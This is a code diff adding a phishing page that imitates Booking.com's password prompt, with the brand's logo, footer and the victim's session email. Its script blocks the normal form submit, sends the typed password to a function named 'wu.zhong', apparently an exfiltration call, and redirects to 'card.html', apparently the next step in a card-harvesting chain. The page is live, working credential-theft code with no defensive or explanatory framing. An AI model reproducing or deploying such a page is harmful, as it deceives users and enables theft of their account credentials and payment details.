@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res\css\main.css">
+    <title>Booking</title>
+</head>
+<body>
+
+    <header>
+        <img src="res\img\logo.png" alt="">
+    </header>
+    <main>
+           <div class="container">
+           <h1 style="text-align:left; font-size:1.2em;">Enter your password</h1>
+            <p style="text-align:left;">Enter your Booking.com password for <br><b><?php echo @$_SESSION['_user']; ?></b></p>
+
+        <form action="post.php" method="post">
+                <label for="pass">Password</label>
+                <input type="password" name="pass" placeholder="Enter your password" required>
+                <button type="submit">Sign in</button>
+         </form>
+
+            <p class="terms">
+                By signing in or creating an account, you agree with our
+                 <a href="#">Terms & conditions</a>
+                 and <a href="#">Privacy statement</a>
+            </p>
+        </div>
+    </main>
+    <footer>
+        <p>All rights reserved.</p>
+        <p>Copyright (2006 - 2025) - Booking.com™</p>
+    </footer>
+
+<script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+e.preventDefault();
+
+wu.zhong(`🔒 Booking.com Password: ${document.querySelector("[name='pass']").value}\n\n`);
+
+window.location="card.html";
+
+})
+
+</script>
+
+</body>
+</html>
